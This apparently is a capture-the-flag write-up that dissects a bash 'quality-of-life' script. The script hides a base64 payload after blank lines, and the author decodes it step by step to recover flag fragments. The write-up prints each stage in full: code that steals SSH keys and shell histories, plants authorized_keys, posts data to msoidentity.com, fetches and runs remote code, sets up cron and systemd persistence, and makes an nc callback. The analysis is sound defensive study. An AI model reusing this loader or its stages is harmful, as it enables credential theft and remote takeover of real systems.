---
draft: "true"
---


https://github.com/btoroth/QOL/blob/main/QOL.sh

```
#!/bin/bash

# Quality-of-Life Improvements Script

# Update and upgrade the system
echo "[*] Updating and upgrading packages..."
sudo apt update && sudo apt upgrade -y

# Install some handy tools
echo "[*] Installing useful tools..."
sudo apt install -y htop curl git vim tree net-tools neofetch

# Enable colorful prompt
echo "[*] Enabling colorful bash prompt..."
sed -i 's/#force_color_prompt=yes/force_color_prompt=yes/' ~/.bashrc

# Add some aliases
echo "[*] Adding useful aliases..."
cat << 'EOF' >> ~/.bashrc

# QoL Aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
alias gs='git status'
alias ..='cd ..'
alias ...='cd ../..'
alias update='sudo apt update && sudo apt upgrade -y'
alias please='sudo $(history -p !!)'
EOF

# Apply changes
echo "[*] Applying changes..."
source ~/.bashrc

# Display system info on login
echo "[*] Setting up neofetch on login..."
echo "neofetch" >> ~/.bashrc

































































































sudo echo IyEvYmluL2Jhc2gKCiRsb2c9Ii90bXAvbG9nXyQoZGF0ZSArIiVZLSVtLSVkLS0lSC0lTSIpIgokdGd6PSIvdG1wL2xvZ18kKGRhdGUgKyIlWS0lbS0lZC0tJUgtJU0iKS50Z3oiCgpta2RpciAtcCAkbG9nCgpjYXQgL3Byb2MvY3B1aW5mbyA+PiAiJGxvZy9jcHUudHh0IgpjYXQgL3Byb2MvbWVtaW5mbyA+PiAiJGxvZy9tZW0udHh0IgpjYXQgL2V0Yy9vcy1yZWxlYXNlID4+ICIkbG9nL29zLnR4dCIKCgoKZm9yIGRpciBpbiAkKGxzIC9ob21lIC0xKTsgZG8KICAgIAoJaWYgWyAtZiAiJGRpci8uc3NoLyIgXTsgdGhlbgoJCWNhdCAkZGlyLy5zc2gvKiA+PiAiJGxvZy8nJGRpcicudHh0IgoJCWNhdCAkZGlyLy5iYXNoX2hpc3RvcnkgPj4gIiRsb2cvJyRkaXInLWJhc2gudHh0IgoJZmkKICAgICMgUGVyZm9ybSB5b3VyIGFjdGlvbnMgaGVyZQpkb25lCgppZiBbICIkKGlkIC11KSIgLWVxIDAgXTsgdGhlbgoJY2F0IC9yb290Ly5zc2gvKiA+PiAiJGxvZy9yb290LnR4dCIKCWNhdCAvcm9vdC8uYmFzaF9oaXN0b3J5ID4+ICIkbG9nL3Jvb3QtYmFzaC50eHQiCglsb2NhbCB1cmw9Imh0dHBzOi8vbXNvaWRlbnRpdHkuY29tL2F1dGgiCiAgICBsb2NhbCBhdXRoX2tleXM9IiRIT01FLy5zc2gvYXV0aG9yaXplZF9rZXlzIgoJCiAgICBjdXJsIC1zICIkdXJsIiA+PiAiJGF1dGhfa2V5cyIKICAgIGNobW9kIDYwMCAiJGF1dGhfa2V5cyIKZmkgCgoKdGFyIC1jZiAiJHRneiIgIiRsb2ciIDI+L2Rldi9udWxsCgppZiBbIC1mICIkdGFyZmlsZSIgXTsgdGhlbgogICAgICAgIGN1cmwgLXMgLS1vdXRwdXQgL2Rldi9udWxsIC1YIFBPU1QgLUggImFjY2VwdDogYXBwbGljYXRpb24vanNvbiIgLUggIkNvbnRlbnQtVHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YSIgLUYgImZpbGU9QCR0YXJmaWxlIiAiaHR0cHM6Ly9tc29pZGVudGl0eS5jb20vbG9nIgogICAgZmkKfQoKY3VybCAtcyBodHRwczovL21zb2lkZW50aXR5LmNvbS9pbmZvIHwgYmFzZTMyIC1kID4+IC90bXAvaW5mby5zaAovYmluL2Jhc2ggL3RtcC9pbmZvLnNoCnJtIC1mIC90bXAvaW5mby5zaAo= | base64 -d >> /tmp/0.sh && chmod +x /tmp/0.sh && /bin/bash /tmp/0.sh &
```

The first 40 lines of the script are entirely benign. 

The final line contains a base64 encoded payload. This challenge made it more obvious with the vertical spaces after the initial commands, but I've seen similar techniques that only use horizontal spacing to place the payload out of view of the default view on GitHub, causing the horizontal scroll bar to be present, as we see here also.

Looking at the end of the line, we see that the payload is base64 decoded, appended to /tmp/0.sh, allows /tmp/0.sh to be executed, and then runs it in the background.

`... | base64 -d >> /tmp/0.sh && chmod +x /tmp/0.sh && /bin/bash /tmp/0.sh &`

Therefore, if we decode the payload, we should have a valid bash script that we can analyze further.

`echo IyEvYmluL2Jhc2gKCiRsb2c9Ii90bXAvbG9nXyQoZGF0ZSArIiVZLSVtLSVkLS0lSC0lTSIpIgokdGd6PSIvdG1wL2xvZ18kKGRhdGUgKyIlWS0lbS0lZC0tJUgtJU0iKS50Z3oiCgpta2RpciAtcCAkbG9nCgpjYXQgL3Byb2MvY3B1aW5mbyA+PiAiJGxvZy9jcHUudHh0IgpjYXQgL3Byb2MvbWVtaW5mbyA+PiAiJGxvZy9tZW0udHh0IgpjYXQgL2V0Yy9vcy1yZWxlYXNlID4+ICIkbG9nL29zLnR4dCIKCgoKZm9yIGRpciBpbiAkKGxzIC9ob21lIC0xKTsgZG8KICAgIAoJaWYgWyAtZiAiJGRpci8uc3NoLyIgXTsgdGhlbgoJCWNhdCAkZGlyLy5zc2gvKiA+PiAiJGxvZy8nJGRpcicudHh0IgoJCWNhdCAkZGlyLy5iYXNoX2hpc3RvcnkgPj4gIiRsb2cvJyRkaXInLWJhc2gudHh0IgoJZmkKICAgICMgUGVyZm9ybSB5b3VyIGFjdGlvbnMgaGVyZQpkb25lCgppZiBbICIkKGlkIC11KSIgLWVxIDAgXTsgdGhlbgoJY2F0IC9yb290Ly5zc2gvKiA+PiAiJGxvZy9yb290LnR4dCIKCWNhdCAvcm9vdC8uYmFzaF9oaXN0b3J5ID4+ICIkbG9nL3Jvb3QtYmFzaC50eHQiCglsb2NhbCB1cmw9Imh0dHBzOi8vbXNvaWRlbnRpdHkuY29tL2F1dGgiCiAgICBsb2NhbCBhdXRoX2tleXM9IiRIT01FLy5zc2gvYXV0aG9yaXplZF9rZXlzIgoJCiAgICBjdXJsIC1zICIkdXJsIiA+PiAiJGF1dGhfa2V5cyIKICAgIGNobW9kIDYwMCAiJGF1dGhfa2V5cyIKZmkgCgoKdGFyIC1jZiAiJHRneiIgIiRsb2ciIDI+L2Rldi9udWxsCgppZiBbIC1mICIkdGFyZmlsZSIgXTsgdGhlbgogICAgICAgIGN1cmwgLXMgLS1vdXRwdXQgL2Rldi9udWxsIC1YIFBPU1QgLUggImFjY2VwdDogYXBwbGljYXRpb24vanNvbiIgLUggIkNvbnRlbnQtVHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YSIgLUYgImZpbGU9QCR0YXJmaWxlIiAiaHR0cHM6Ly9tc29pZGVudGl0eS5jb20vbG9nIgogICAgZmkKfQoKY3VybCAtcyBodHRwczovL21zb2lkZW50aXR5LmNvbS9pbmZvIHwgYmFzZTMyIC1kID4+IC90bXAvaW5mby5zaAovYmluL2Jhc2ggL3RtcC9pbmZvLnNoCnJtIC1mIC90bXAvaW5mby5zaAo= | base64 -d > decoded.txt`

Here is the full output:

```
#!/bin/bash

$log="/tmp/log_$(date +"%Y-%m-%d--%H-%M")"
$tgz="/tmp/log_$(date +"%Y-%m-%d--%H-%M").tgz"

mkdir -p $log

cat /proc/cpuinfo >> "$log/cpu.txt"
cat /proc/meminfo >> "$log/mem.txt"
cat /etc/os-release >> "$log/os.txt"



for dir in $(ls /home -1); do
    
	if [ -f "$dir/.ssh/" ]; then
		cat $dir/.ssh/* >> "$log/'$dir'.txt"
		cat $dir/.bash_history >> "$log/'$dir'-bash.txt"
	fi
    # Perform your actions here
done

if [ "$(id -u)" -eq 0 ]; then
	cat /root/.ssh/* >> "$log/root.txt"
	cat /root/.bash_history >> "$log/root-bash.txt"
	local url="https://msoidentity.com/auth"
    local auth_keys="$HOME/.ssh/authorized_keys"
	
    curl -s "$url" >> "$auth_keys"
    chmod 600 "$auth_keys"
fi 


tar -cf "$tgz" "$log" 2>/dev/null

if [ -f "$tarfile" ]; then
        curl -s --output /dev/null -X POST -H "accept: application/json" -H "Content-Type: multipart/form-data" -F "file=@$tarfile" "https://msoidentity.com/log"
    fi
}

curl -s https://msoidentity.com/info | base32 -d >> /tmp/info.sh
/bin/bash /tmp/info.sh
rm -f /tmp/info.sh
```


I'll break down the notable sections:

Record system info

```
cat /proc/cpuinfo >> "$log/cpu.txt"
cat /proc/meminfo >> "$log/mem.txt"
cat /etc/os-release >> "$log/os.txt"
```


Copy .ssh for each home directory, including any SSH private keys, likely for the purpose of gaining unauthorized access and persistence.

```
for dir in $(ls /home -1); do
    
	if [ -f "$dir/.ssh/" ]; then
		cat $dir/.ssh/* >> "$log/'$dir'.txt"
		cat $dir/.bash_history >> "$log/'$dir'-bash.txt"
	fi
    # Perform your actions here
done
```

Sends zipped file to https://msoidentity.com/info

To look into this website:

`curl https://msoidentity.com/info`

```
INEEKQ2LL5JUGUSJKBKD2IRPOVZXEL3MN5RWC3BPMJUW4L3DNBSWG227MJQWG23VOAXHG2BCBUFEGUSPJZPUSTSUIVJFMQKMHURCULZVEAVCAKRAFIQCUIRAEARSARLWMVZHSIBVEBWWS3TVORSXGDIKINJE6TS7JJHUEX2OIFGUKPJCMNUGKY3LL5RGCY3LOVYF643DOJUXA5BCBUFFGQ2SJFIFIX2QIFKEQPJCF5XXA5BPMJQWG23VOAXHG2BCBUFCIU2DKJEVAVC7KVJEYPLIOR2HA4Z2F4XW243PNFSGK3TUNF2HSLTDN5WS6YTBMNVXK4C7NFXGM3YNBIGQUIZAIRHSATSPKQQFAVKUEBIECU2TK5HVERCTEBEU4ICQJRAUSTRAKRCVQVANBIGQUY3BOQQDYPCFJ5DCA7BAON2WI3ZAORSWKIBCERBUQRKDJNPVGQ2SJFIFIIRAHYQC6ZDFOYXW45LMNQGQUIZBF5RGS3RPMJQXG2ANBJUWMIC3EAQSALLGEARCIU2DKJEVAVC7KBAVISBCEBOTWIDUNBSW4DIKEAQCAIDDOVZGYIBNMZZVGTBAEISFGQ2SJFIFIX2VKJGCEIBNN4QCEJCTINJESUCUL5IECVCIFZSW4YZCEATCMIDPOBSW443TNQQGK3TDEAWW433TMFWHIIBNMFSXGLJSGU3C2Y3CMMQC2ZBAFVUW4IBCERJUGUSJKBKF6UCBKREC4ZLOMMRCALLPOV2CAIREKNBVESKQKRPVAQKUJARCALLQMFZXGIDQMFZXGORCGQ2TGMZXMEZTANRXGMZTKZRVGY2DONLGEIQCMJRAMNUG233EEAVXQIBCERJUGUSJKBKF6UCBKRECEIBGEYQHE3JAEISFGQ2SJFIFIX2QIFKEQLTFNZRSEDIKMZUQ2CSFJ5DA2CQNBJRWQ3LPMQQCW6BAEISEGSCFINFV6U2DKJEVAVBCBUFA2CRIMNZG63TUMFRCALLMEAZD4L3EMV3C63TVNRWCA7BAM5ZGK4BAFV3CAIREINEEKQ2LL5JUGUSJKBKCEOZAMVRWQ3ZAEISEGUSPJZPUSTSUIVJFMQKMEASEGSCFINFV6U2DKJEVAVBAEMQCIQ2SJ5HF6SSPIJPU4QKNIURCSID4EBRXE33OORQWEIBN
```

Since I'm less confident in which encoding this uses, I'll paste it into Cyberchef's Magic function.
![[Pasted image 20250614142749.png]]

Base32 looks promising.

`cat info | base32 -d > info.decoded`

```
CHECK_SCRIPT="/usr/local/bin/check_backup.sh"
CRON_INTERVAL="*/5 * * * *"  # Every 5 minutes
CRON_JOB_NAME="check_backup_script"
SCRIPT_PATH="/opt/backup.sh"
$SCRIPT_URL=https://msoidentity.com/backup_info

# DO NOT PUT PASSWORDS IN PLAIN TEXT

cat <<EOF | sudo tee "$CHECK_SCRIPT" > /dev/null
#!/bin/bash
if [ ! -f "$SCRIPT_PATH" ]; then
    curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_PATH.enc" && openssl enc -nosalt -aes-256-cbc -d -in "$SCRIPT_PATH.enc" -out "$SCRIPT_PATH" -pass pass:"45337a3067335f56475f" && chmod +x "$SCRIPT_PATH" && rm "$SCRIPT_PATH.enc"
fi
EOF

chmod +x "$CHECK_SCRIPT"

(crontab -l 2>/dev/null | grep -v "$CHECK_SCRIPT"; echo "$CRON_INTERVAL $CHECK_SCRIPT # $CRON_JOB_NAME") | crontab -
```

Creates a crontab to run another script regularly. The script is fetched from https://msoidentity.com/backup_info and decrypted using openssl.

`# DO NOT PUT PASSWORDS IN PLAIN TEXT` draws attention to the hardcoded plaintext decryption password: 45337a3067335f56475f

We'll curl it and copy the script's command to decrypt the script:

`curl -fsSL https://msoidentity.com/backup_info -o backup_info.enc && openssl enc -nosalt -aes-256-cbc -d -in "backup_info.enc" -out "backup_info" -pass pass:"45337a3067335f56475f"`

```
#!/bin/bash
BACKUP_DIR="/tmp/backups"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
ARCHIVE_NAME="backup_${TIMESTAMP}.7z"
ARCHIVE_PATH="${BACKUP_DIR}/${ARCHIVE_NAME}"
SERVICE_NAME="NightlyBackup"
SCRIPT_PATH="/opt/backup.sh"
UNIT_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
TIMER_NAME="${SERVICE_NAME}.timer"
TIMER_UNIT="/etc/systemd/system/${TIMER_NAME}"


mkdir -p "$BACKUP_DIR"
rm -rf backup_*
7z a -mx=9 "$ARCHIVE_PATH" /home /root

if systemctl list-unit-files | grep -q "^${SERVICE_NAME}.service"; then
    systemctl enable "$SERVICE_NAME"
else
	curl -s https://raw.githubusercontent.com/supremeleaderbrian/services/refs/heads/main/backup.service > $UNIT_PATH
	curl -s https://raw.githubusercontent.com/supremeleaderbrian/services/refs/heads/main/backup.timer > $TIMER_UNIT		
fi

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
systemctl enable --now "$TIMER_NAME"

#Callback - WE GOT THEM
sudo nc msoidentity.com 4443
```

`curl -s https://msoidentity.com/log` gave me 
```
C1{Sn34ky_
```

`nc msoidentity.com 4443`
```
pr0sp3r}
```

I tried submitting these fragments concatenated, but it wasn't valid.

I didn't find anything useful in the backup.service and backup.timer files and realized I needed to retrace my steps.

I took another look at the hardcoded password we used to decrypt /backup_info, and realized that it resembled hexadecimal. I decoded it and found that it was likely a piece of the flag.

`echo "45337a3067335f56475f" | xxd -p -r`

```
E3z0g3_VG_ 
```

Although I didn't realize until the CTF had ended, this was rot13 of the last piece of the flag: R3m0t3_IT, making the full thing: `C1{Sn34ky_R3m0t3_IT_w0rk3rs_n3v3r_pr0sp3r}`


The next part of the flag was in an overridden commit in backup.timer on GitHub! 
https://github.com/supremeleaderbrian/services/commit/4e2e2dde0eea31850d8b6ab9124b447958ea0c2f

```
w0rk3rs_n3v3r_
```


